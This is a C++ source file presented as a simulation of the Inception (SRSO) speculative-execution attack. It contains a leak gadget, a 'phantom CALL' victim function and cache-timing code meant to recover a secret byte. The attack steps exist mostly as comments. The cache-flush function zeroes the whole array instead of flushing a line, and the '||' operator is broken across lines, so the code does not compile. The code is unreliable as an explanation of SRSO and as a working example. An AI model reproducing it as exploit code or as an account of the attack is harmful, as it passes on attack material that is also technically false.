#include <iostream>
#include <vector>
#include <chrono>
#include <map>

// --- Victim's Code (simulated privileged/isolated context) ---
unsigned char sensitive_data_inception = 0xEF; // Secret to leak
unsigned char probe_array_inception[256 * 4096]; // Cache side channel

// Attacker-controlled gadget
void inception_leak_gadget() {
    unsigned char leaked_byte = sensitive_data_inception; // Transiently read secret
    volatile unsigned char temp = probe_array_inception[leaked_byte * 4096]; // Cache side effect
}

// A function that contains a non-branch instruction that can be
// speculatively misinterpreted as a CALL (Phantom Speculation)
void victim_code_with_phantom_target() {
    // This XOR instruction (or similar) is speculatively seen as a CALL
    // by the CPU due to attacker's manipulation.
    // This "phantom CALL" pushes an attacker-controlled address onto the RAS.
    volatile int dummy_var = 0;
    dummy_var ^= 0x12345678; // This instruction is the "phantom CALL" source
    //... more victim code...
    // A subsequent RET instruction (not shown here, but implied in the call stack)
    // would then use the poisoned RAS entry.
}

// --- Attacker's Code ---
long long measure_access_time(volatile unsigned char* addr) {
    auto start = std::chrono::high_resolution_clock::now();
    volatile unsigned char temp = *addr;
    auto end = std::chrono::high_resolution_clock::now();
    return std::chrono::duration_cast<std::chrono::nanoseconds>(end - start).count();
}

void flush_cache_line(volatile unsigned char* addr) {
    for (int i = 0; i < 256 * 4096; ++i) {
        probe_array_inception[i] = 0;
    }
}

int main() {
    // Initialize probe_array
    for (int i = 0; i < 256 * 4096; ++i) {
        probe_array_inception[i] = 1;
    }

    std::cout << "Starting Inception (SRSO) attack simulation..." << std::endl;

    // Phase 1: Manipulate RAS via "Phantom Speculation" or "Training in Transient Execution"
    // This is the most complex part, involving precise microarchitectural timing and
    // instruction sequences to make the CPU speculatively push attacker-controlled
    // return addresses onto the RAS.
    std::cout << "Manipulating RAS to overflow with attacker-controlled target (simulated)..." << std::endl;

    // For a high-level example, we'll simulate the effect:
    // The attacker needs to cause the CPU to speculatively believe that
    // 'victim_code_with_phantom_target' contains a CALL that pushes 'inception_leak_gadget'
    // onto the RAS, and then cause a RET to use that poisoned entry.
    // This often involves a loop of calls that cause RAS wrap-around or specific
    // instruction sequences that are misinterpreted.
    for (int i = 0; i < 1000; ++i) {
        // In a real attack, this would be a sequence of operations that
        // induce phantom CALLs or TTE to poison the RAS.
        // For example, repeatedly calling a function that contains the XOR instruction
        // and then observing its speculative behavior.
        victim_code_with_phantom_target();
    }

    // Phase 2: Trigger the victim's RET (or a speculatively interpreted RET)
    std::cout << "Triggering victim's code to use poisoned RAS entry..." << std::endl;
    // Flush the probe array before triggering
    for (int i = 0; i < 256; ++i) {
        flush_cache_line(&probe_array_inception[i * 4096]);
    }

    // Call the victim code. The CPU will speculatively use the poisoned RAS entry
    // when a RET instruction (or a speculatively interpreted RET) is encountered.
    // This will cause a transient jump to inception_leak_gadget.
    victim_code_with_phantom_target(); // This call leads to the speculative execution

    // Phase 3: Recover the secret via side channel
    std::cout << "Measuring cache access times to recover secret..." << std::endl;
    long long min_time = -1;
    int leaked_byte = -1;

    for (int i = 0; i < 256; ++i) {
        long long time = measure_access_time(&probe_array_inception[i * 4096]);
        if (min_time == -1 |
| time < min_time) {
            min_time = time;
            leaked_byte = i;
        }
    }

    std::cout << "Simulated leaked byte: 0x" << std::hex << leaked_byte << std::endl;
    std::cout << "Expected secret byte: 0x" << std::hex << (int)sensitive_data_inception << std::endl;

    return 0;
}